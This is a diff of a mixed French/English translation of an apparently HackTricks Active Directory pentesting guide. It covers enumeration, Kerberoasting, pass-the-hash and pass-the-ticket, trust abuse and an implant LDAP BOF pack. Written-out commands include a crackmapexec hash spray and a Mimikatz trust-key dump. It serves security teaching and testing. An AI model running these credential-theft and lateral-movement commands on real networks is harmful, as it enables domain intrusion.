-Le même workflow exact s'applique aux réponses challenge-response NetNTLM (`-m 27000/27100`) et à DCC (`-m 31500`). Une fois une correspondance identifiée vous pouvez lancer relay, SMB/WMI/WinRM PtH, ou casser à nouveau le NT hash avec des masks/rules hors ligne.
+Le même workflow exact s’applique aux réponses challenge NetNTLM (`-m 27000/27100`) et à DCC (`-m 31500`). Une fois une correspondance identifiée, vous pouvez lancer relay, SMB/WMI/WinRM PtH, ou re-crack le NT hash avec des masks/rules hors ligne.
 
 
 
 ## Enumerating Active Directory WITH credentials/session
 
-Pour cette phase vous devez avoir **compromis les credentials ou une session d'un compte de domaine valide.** Si vous avez des credentials valides ou un shell comme utilisateur de domaine, **vous devez vous rappeler que les options données avant restent des options pour compromettre d'autres utilisateurs**.
+For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.
 
-Avant de commencer l'énumération authentifiée vous devez connaître le **Kerberos double hop problem.**
+Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**
 
 
 {{#ref}}
@@ -280,33 +318,33 @@ kerberos-double-hop-problem.md
 
 ### Enumeration
 
-Avoir compromis un compte est une **grande étape pour commencer à compromettre tout le domaine**, car vous allez pouvoir commencer l'**Active Directory Enumeration:**
+Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**
 
-Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver chaque utilisateur potentiellement vulnérable, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les usernames** et essayer le mot de passe du compte compromis, les mots de passe vides et de nouveaux mots de passe prometteurs.
+Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.
 
-- Vous pourriez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
-- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus furtif
-- Vous pouvez aussi [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
-- Un autre outil formidable pour la recon dans active directory est [**BloodHound**](bloodhound.md). Il n'est **pas très furtif** (selon les méthodes de collecte que vous utilisez), mais **si cela ne vous dérange pas**, vous devriez absolument l'essayer. Trouvez où les users peuvent faire du RDP, trouvez des chemins vers d'autres groupes, etc.
+- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
+- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
+- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
+- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
 - **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
-- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
-- Un **outil avec GUI** que vous pouvez utiliser pour énumérer le directory est **AdExplorer.exe** de la suite **SysInternal**.
-- Vous pouvez aussi chercher dans la base LDAP avec **ldapsearch** pour trouver des credentials dans les champs _userPassword_ et _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
-- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
-- Vous pourriez aussi essayer des outils automatisés comme:
+- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
+- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
+- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
+- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
+- You could also try automated tools as:
 - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
 - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
 - **Extracting all domain users**
 
-Il est très facile d'obtenir tous les usernames du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`
+It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`
 
-> Même si cette section Enumeration paraît petite, c'est la partie la plus importante de toutes. Accédez aux liens (surtout ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à ce que vous soyez à l'aise. Pendant un assessment, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider que rien ne peut être fait.
+> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.
 
 ### Kerberoast
 
-Kerberoasting consiste à obtenir des **tickets TGS** utilisés par des services liés à des comptes utilisateur et à casser leur chiffrement — qui est basé sur les mots de passe utilisateur — **hors ligne**.
+Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.
 
-Plus d'informations à ce sujet dans :
+More about this in:
 
 
 {{#ref}}
@@ -315,17 +353,17 @@ kerberoast.md
 
 ### Remote connexion (RDP, SSH, FTP, Win-RM, etc)
 
-Une fois que vous avez obtenu quelques credentials vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter à plusieurs serveurs avec différents protocoles, selon vos port scans.
+Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.
 
 ### Local Privilege Escalation
 
-Si vous avez compromis des credentials ou une session comme utilisateur de domaine standard et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine dans le domaine** vous devriez essayer de trouver un moyen d'**escalader les privilèges localement et de looter des credentials**. C'est parce qu'uniquement avec des privilèges d'administrateur local vous pourrez **dump les hashes d'autres users** en mémoire (LSASS) et localement (SAM).
+If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).
 
-Il existe une page complète dans ce livre sur [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). N'oubliez pas non plus d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).
+There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).
 
 ### Current Session Tickets
 
-Il est très **improbable** que vous trouviez des **tickets** dans la session actuelle de l'user vous donnant la permission d'accéder à des ressources inattendues, mais vous pouvez vérifier:
+It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
 ```bash
 ## List all tickets (if not admin, only current user tickets)
 .\Rubeus.exe triage
@@ -335,17 +373,17 @@ Il est très **improbable** que vous trouviez des **tickets** dans la session ac
 ```
 ### NTLM Relay
 
-Si vous avez réussi à énumérer l'active directory, vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourriez être en mesure de forcer des **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**
+Si vous avez réussi à énumérer l'active directory, vous aurez **plus d'emails et une meilleure compréhension du réseau**. Vous pourrez peut-être forcer des **relay attacks** NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**
 
 ### Looks for Creds in Computer Shares | SMB Shares
 
-Maintenant que vous avez quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés à l'intérieur de l'AD**. Vous pourriez le faire manuellement, mais c'est une tâche très ennuyeuse et répétitive (et encore plus si vous trouvez des centaines de docs que vous devez vérifier).
+Maintenant que vous avez quelques identifiants de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés à l'intérieur de l'AD**. Vous pourriez le faire manuellement, mais c'est une tâche répétitive très ennuyeuse (et encore plus si vous trouvez des centaines de docs que vous devez vérifier).
 
-[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)
+[**Suivez ce lien pour en savoir plus sur les tools que vous pourriez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)
 
 ### Steal NTLM Creds
 
-Si vous pouvez **accéder à d'autres PCs ou shares**, vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont accessibles d'une manière ou d'une autre, vont t**rigger une authentification NTLM contre vous** afin que vous puissiez **steal** le **NTLM challenge** pour le craquer :
+Si vous pouvez **accéder à d'autres PCs ou shares**, vous pourriez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont accédés d'une manière ou d'une autre, **déclencheront une authentification NTLM contre vous** afin que vous puissiez **steal** le **NTLM challenge** pour le craquer :
 
 
 {{#ref}}
@@ -354,7 +392,7 @@ Si vous pouvez **accéder à d'autres PCs ou shares**, vous pourriez **placer de
 
 ### CVE-2021-1675/CVE-2021-34527 PrintNightmare
 
-Cette vulnérabilité permettait à tout utilisateur authentifié de **compromise the domain controller**.
+Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le domain controller**.
 
 
 {{#ref}}
@@ -363,23 +401,23 @@ printnightmare.md
 
 ## Privilege escalation on Active Directory WITH privileged credentials/session
 
-**Pour les techniques suivantes, un simple utilisateur du domaine ne suffit pas ; vous avez besoin de privilèges/identifiants spéciaux pour réaliser ces attaques.**
+**Pour les techniques suivantes, un simple utilisateur du domaine ne suffit pas, vous avez besoin de privilèges/identifiants spéciaux pour effectuer ces attaques.**
 
 ### Hash extraction
 
-En espérant que vous ayez réussi à **compromise some local admin** account en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) y compris le relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
-Puis, il est temps de dumper tous les hashes en mémoire et en local.\
-[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)
+En espérant que vous ayez réussi à **compromettre un compte local admin** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) y compris le relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [l'escalade de privilèges locale](../windows-local-privilege-escalation/index.html).\
+Puis, il est temps de dumper tous les hashes en mémoire et localement.\
+[**Lisez cette page sur les différentes façons d'obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)
 
 ### Pass the Hash
 
 **Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **l'usurper**.\
-Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM à l'aide** de ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, afin que, lorsqu'une **authentification NTLM est effectuée**, **ce hash soit utilisé**. La dernière option est ce que fait mimikatz.\
-[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)
+Vous devez utiliser un **tool** qui **effectuera** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer une nouvelle **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, afin que lorsqu'une authentification **NTLM** est effectuée, **ce hash soit utilisé**. La dernière option est ce que fait mimikatz.\
+[**Lisez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)
 
 ### Over Pass the Hash/Pass the Key
 
-Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique via le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d'authentification.
+Cette attaque vise à **utiliser le hash NTLM de l'utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique via le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos** est autorisé comme protocole d'authentification.
 
 
 {{#ref}}
@@ -388,7 +426,7 @@ over-pass-the-hash-pass-the-key.md
 
 ### Pass the Ticket
 
-Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou des valeurs de hash. Ce ticket volé est ensuite utilisé pour **usurper l'utilisateur**, obtenant ainsi un accès non autorisé aux ressources et services au sein d'un réseau.
+Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **usurper l'utilisateur**, obtenant un accès non autorisé aux ressources et services au sein d'un réseau.
 
 
 {{#ref}}
@@ -397,14 +435,14 @@ pass-the-ticket.md
 
 ### Credentials Reuse
 
-Si vous avez le **hash** ou le **mot de passe** d'un **administrateur local**, vous devriez essayer de vous **connecter localement** à d'autres **PCs** avec celui-ci.
+Si vous avez le **hash** ou le **mot de passe** d'un **administrateur local**, vous devriez essayer de vous **connecter localement** à d'autres **PCs** avec.
 ```bash
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
 > [!WARNING]
-> Note that this is quite **bruyant** and **LAPS** would **mitiger** it.
+> Note that this is quite **bruyant** and **LAPS** would **mitigate** it.
 
 ### MSSQL Abuse & Trusted Links
 
@@ -702,6 +740,15 @@ If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one.
 
 **Different trusting relationships**
 
+- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
+- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
+- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
+- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
+- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
+- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.
+
+#### Other differences in **trusting relationships**
+
 - A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
 - A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).
 
@@ -730,7 +777,7 @@ Get-DomainForeignUser
 # Get groups inside a domain with users our
 Get-DomainForeignGroupMember
 ```
-### Escalade de privilèges Child-to-Parent forest
+### Élévation de privilèges de forêt child-to-parent
 ```bash
 # Fro powerview
 Get-DomainTrust
@@ -743,7 +790,7 @@ TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
 WhenCreated     : 2/19/2021 1:28:00 PM
 WhenChanged     : 2/19/2021 1:28:00 PM
 ```
-Autres façons d’énumérer les trusts de domaine :
+Autres moyens d’énumérer les trusts de domaine :
 ```bash
 # Get DCs
 nltest /dsgetdc:<DOMAIN>
@@ -756,8 +803,8 @@ nltest /dclist:sub.domain.local
 nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
 ```
 > [!WARNING]
-> Il existe **2 clés de confiance**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
-> Vous pouvez celle utilisée par le domaine courant avec :
+> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
+> You can the one used by the current domain them with:
 >
 > ```bash
 > Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
@@ -766,7 +813,7 @@ nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
 
 #### SID-History Injection
 
-Élevez-vous en tant que Enterprise admin vers le domaine enfant/parent en abusant de la trust avec SID-History injection :
+Élever les privilèges jusqu’à Enterprise admin depuis le domaine child/parent en abusant de la trust avec SID-History injection:
 
 
 {{#ref}}
@@ -775,26 +822,26 @@ sid-history-injection.md
 
 #### Exploit writeable Configuration NC
 
-Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de référentiel central pour les données de configuration dans une forêt, dans les environnements Active Directory (AD). Ces données sont répliquées sur chaque Domain Controller (DC) de la forêt, les DC inscriptibles conservant une copie inscriptible du Configuration NC. Pour exploiter cela, il faut disposer de **privilèges SYSTEM sur un DC**, de préférence un child DC.
+Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de dépôt central pour les données de configuration à travers une forest dans les environnements Active Directory (AD). Ces données sont répliquées sur chaque Domain Controller (DC) au sein de la forest, les DC en écriture conservant une copie inscriptible du Configuration NC. Pour exploiter cela, il faut disposer de **privilèges SYSTEM sur un DC**, de préférence un child DC.
 
 **Link GPO to root DC site**
 
-Le conteneur Sites du Configuration NC inclut des informations sur les sites de tous les ordinateurs joints au domaine au sein de la forêt AD. En opérant avec des privilèges SYSTEM sur n’importe quel DC, les attaquants peuvent lier des GPO aux sites du root DC. Cette action peut compromettre le root domain en manipulant les policies appliquées à ces sites.
+Le conteneur Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forest AD. En opérant avec des privilèges SYSTEM sur n’importe quel DC, les attaquants peuvent lier des GPO aux sites du root DC. Cette action peut compromettre le root domain en manipulant les politiques appliquées à ces sites.
 
-Pour des informations approfondies, on peut consulter des recherches sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).
+Pour des informations approfondies, on peut consulter les recherches sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).
 
 **Compromise any gMSA in the forest**
 
-Un vecteur d’attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans le Configuration NC. Avec des privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la KDS Root key et de calculer les mots de passe de n’importe quel gMSA dans toute la forêt.
+Un vecteur d’attaque consiste à cibler des gMSA privilégiés dans le domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans le Configuration NC. Avec des privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la KDS Root key et de calculer les mots de passe de n’importe quel gMSA dans la forest.
 
-Une analyse détaillée et une procédure étape par étape sont disponibles dans :
+Une analyse détaillée et des étapes pas à pas sont disponibles dans :
 
 
 {{#ref}}
 golden-dmsa-gmsa.md
 {{#endref}}
 
-Attaque complémentaire sur delegated MSA (BadSuccessor – abus des attributs de migration) :
+Attaque MSA déléguée complémentaire (BadSuccessor – abus des attributs de migration) :
 
 
 {{#ref}}
@@ -805,13 +852,13 @@ Recherche externe supplémentaire : [Golden gMSA Trust Attacks](https://improsec
 
 **Schema change attack**
 
-Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le AD Schema pour accorder à n’importe quel utilisateur le contrôle complet sur toutes les classes. Cela peut mener à un accès non autorisé et au contrôle des nouveaux objets AD créés.
+Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le AD Schema pour accorder à n’importe quel utilisateur un contrôle complet sur toutes les classes. Cela peut conduire à un accès non autorisé et au contrôle des nouveaux objets AD créés.
 
-Des informations complémentaires sont disponibles dans [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).
+Des informations complémentaires sont disponibles sur [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).
 
 **From DA to EA with ADCS ESC5**
 
-La vulnérabilité ADCS ESC5 cible le contrôle des objets Public Key Infrastructure (PKI) afin de créer un certificate template qui permet l’authentification en tant que n’importe quel utilisateur dans la forêt. Comme les objets PKI résident dans le Configuration NC, la compromission d’un child DC inscriptible permet l’exécution d’attaques ESC5.
+La vulnérabilité ADCS ESC5 vise le contrôle des objets Public Key Infrastructure (PKI) afin de créer un certificat template permettant l’authentification en tant que n’importe quel utilisateur au sein de la forest. Comme les objets PKI résident dans le Configuration NC, compromettre un child DC inscriptible permet d’exécuter des attaques ESC5.
 
 Plus de détails peuvent être lus dans [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Dans les scénarios sans ADCS, l’attaquant a la capacité de mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).
 
@@ -826,14 +873,14 @@ TrustDirection  : Inbound          --> Inboud trust
 WhenCreated     : 2/19/2021 10:50:56 PM
 WhenChanged     : 2/19/2021 10:50:56 PM
 ```
-Dans ce scénario **votre domaine est trusted** par un domaine externe, ce qui vous donne des **permissions indéterminées** sur celui-ci. Vous devrez trouver **quels principals de votre domaine ont quels accès sur le domaine externe** puis essayer de l’exploiter :
+Dans ce scénario **votre domaine est approuvé** par un domaine externe, ce qui vous donne des **permissions indéterminées** sur celui-ci. Vous devrez trouver **quels principaux de votre domaine ont quels accès sur le domaine externe** puis essayer d’en tirer parti :
 
 
 {{#ref}}
 external-forest-domain-oneway-inbound.md
 {{#endref}}
 
-### External Forest Domain - One-Way (Outbound)
+### Domaine de forêt externe - sens unique (sortant)
 ```bash
 Get-DomainTrust -Domain current.local
 
@@ -845,70 +892,70 @@ TrustDirection  : Outbound        --> Outbound trust
 WhenCreated     : 2/19/2021 10:15:24 PM
 WhenChanged     : 2/19/2021 10:15:24 PM
 ```
-Dans ce scénario **votre domaine** **accorde** certains **privilèges** à un principal provenant de **différents domaines**.
+Dans ce scénario, **votre domaine** accorde certaines **privilèges** à un principal provenant d’**un domaine différent**.
 
-Cependant, lorsqu’un **domaine est trusted** par le domaine qui accorde la confiance, le domaine trusted **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le trusted password**. Ce qui signifie qu’il est possible d’**accéder à un utilisateur du domaine qui accorde la confiance pour entrer dans le domaine trusted** afin de l’énumérer et d’essayer d’élever davantage de privilèges :
+Cependant, lorsqu’**un domaine est trusted** par le domaine trusting, le domaine trusted **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le trusted password**. Cela signifie qu’il est possible d’**accéder à un utilisateur du domaine trusting pour entrer dans le domaine trusted** afin de l’énumérer et d’essayer d’escalader davantage de privilèges :
 
 
 {{#ref}}
 external-forest-domain-one-way-outbound.md
 {{#endref}}
 
-Une autre façon de compromettre le domaine trusted est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la confiance entre domaines (ce qui n’est pas très courant).
+Une autre façon de compromettre le domaine trusted est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** au domaine trust (ce qui n’est pas très courant).
 
-Une autre façon de compromettre le domaine trusted est d’attendre sur une machine où un **utilisateur du domaine trusted peut accéder** pour se connecter via **RDP**. Ensuite, l’attaquant pourrait injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis là.\
-De plus, si la **victime a monté son disque dur**, depuis le processus de la **session RDP** l’attaquant pourrait stocker des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s’appelle **RDPInception.**
+Une autre façon de compromettre le domaine trusted est d’attendre, sur une machine à laquelle **un utilisateur du domaine trusted peut accéder**, une connexion via **RDP**. Ensuite, l’attaquant pourrait injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis là.\
+De plus, si **la victime a monté son disque dur**, depuis le processus de **session RDP**, l’attaquant pourrait stocker des **backdoors** dans le **dossier startup du disque dur**. Cette technique s’appelle **RDPInception.**
 
 
 {{#ref}}
 rdp-sessions-abuse.md
 {{#endref}}
 
-### Atténuation de l’abus de trust entre domaines
+### Atténuation de l’abus des domain trust
 
-### **SID Filtering :**
+### **SID Filtering:**
 
-- Le risque d’attaques exploitant l’attribut SID history à travers les forest trusts est atténué par SID Filtering, qui est activé par défaut sur tous les inter-forest trusts. Cela repose sur l’hypothèse que les intra-forest trusts sont sécurisés, en considérant la forest, plutôt que le domaine, comme la frontière de sécurité, conformément à la position de Microsoft.
-- Cependant, il y a un piège : SID filtering peut perturber les applications et l’accès des utilisateurs, ce qui conduit parfois à sa désactivation.
+- Le risque d’attaques exploitant l’attribut SID history à travers les forest trusts est réduit par le SID Filtering, activé par défaut sur tous les inter-forest trusts. Cela repose sur l’hypothèse que les intra-forest trusts sont sécurisés, considérant la forest, plutôt que le domain, comme frontière de sécurité, conformément à la position de Microsoft.
+- Cependant, il y a un piège : le SID filtering peut perturber les applications et l’accès des utilisateurs, ce qui conduit parfois à sa désactivation.
 
-### **Selective Authentication :**
+### **Selective Authentication:**
 
-- Pour les inter-forest trusts, l’utilisation de Selective Authentication garantit que les utilisateurs des deux forests ne sont pas authentifiés automatiquement. À la place, des autorisations explicites sont requises pour que les utilisateurs accèdent aux domaines et serveurs au sein du domaine ou de la forest qui accorde la confiance.
-- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du writable Configuration Naming Context (NC) ou contre les attaques sur le trust account.
+- Pour les inter-forest trusts, l’utilisation de Selective Authentication garantit que les utilisateurs des deux forests ne sont pas authentifiés automatiquement. À la place, des permissions explicites sont requises pour que les utilisateurs accèdent aux domaines et serveurs au sein du domaine trusting ou de la forest.
+- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du writable Configuration Naming Context (NC) ou des attaques sur le trust account.
 
-[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
+[**Plus d’informations sur les domain trusts sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
 
 ## LDAP-based AD Abuse from On-Host Implants
 
-The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.
+La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente les primitives LDAP de type bloodyAD sous forme de x64 Beacon Object Files qui s’exécutent entièrement à l’intérieur d’un on-host implant (par exemple, Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis appellent `ldap <subcommand>` depuis le beacon. Tout le trafic passe par le contexte de sécurité de connexion actuel via LDAP (389) avec signing/sealing ou LDAPS (636) avec auto certificate trust, donc aucun socks proxy ni artefact sur disque n’est requis.
 
 ### Implant-side LDAP enumeration
 
